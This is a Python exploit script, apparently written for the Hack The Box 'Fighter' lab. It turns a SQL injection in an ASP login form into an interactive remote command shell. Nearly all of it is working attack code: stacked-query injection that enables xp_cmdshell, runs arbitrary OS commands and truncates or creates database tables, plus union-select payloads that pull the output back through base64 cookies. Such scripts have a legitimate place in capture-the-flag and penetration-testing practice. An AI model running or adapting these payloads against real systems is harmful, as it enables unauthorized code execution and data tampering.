#SQL Injection Pseudo-Shell for HTB's Fighter
#MS SQL 2014

import requests
from base64 import b64decode
from urllib.parse import unquote

def logo():
    display = "░██████╗░██████╗░██╗░░░░░\n"
    display += "██╔════╝██╔═══██╗██║░░░░░\n"
    display += "╚█████╗░██║██╗██║██║░░░░░\n"
    display += "░╚═══██╗╚██████╔╝██║░░░░░\n"
    display += "██████╔╝░╚═██╔═╝░███████╗\n"
    display += "╚═════╝░░░░╚═╝░░░╚══════╝\n"
    print(display)


def decodeCookies(cookies):
    return b64decode(unquote(cookies['Email']))

def getOutput():
    get_each_column_line = "1 union select 1,2,3,4,(select top 1 ID from test order by ID desc),6-- -"
    column_line_request = makeRequest(get_each_column_line)
    count = int(decodeCookies(column_line_request.cookies))

    for each_column_row in range(1,count):
        line = makeRequest(f'1 union select 1,2,3,4,(select output from test where ID = {each_column_row}),6-- -')
        try:
            output = decodeCookies(line.cookies)
            print(output.decode())
        except:
            None


def makeRequest(sql_command):
    target_url = "http://members.streetfighterclub.htb/old/verify.asp"
    return requests.post(target_url, allow_redirects=False, data={'username':'admin','password':'admin','logintype':sql_command,'rememberme':'ON','B1':'LogIn'})

def runCMD(Input):
    truncatingTable = "1;TRUNCATE TABLE test;"
    makeRequest(truncatingTable)
    Input = Input.replace("'","''")
    makeRequest(f"1;insert into test (output) exec Xp_CmDShelL '{Input}';-- -")
    getOutput()

def Setup(Input):

    TurnOnXPShell = "1;EXEC sp_configure 'show advanced options', 1; exec sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -"
        
    Create_New_Table = "3;CREATE TABLE test (ID int IDENTITY(1,1) PRIMARY KEY, output varchar(1024))" 

    makeRequest(TurnOnXPShell) 

    makeRequest(Create_New_Table)
   
    runCMD(Input)

def main():
    logo()

    while True:
        try:
            Input = input("SQL RCE: ")
            Setup(Input)
        except KeyboardInterrupt:
            print("Bye Bye!")
            exit()

if __name__ == "__main__":
    main()
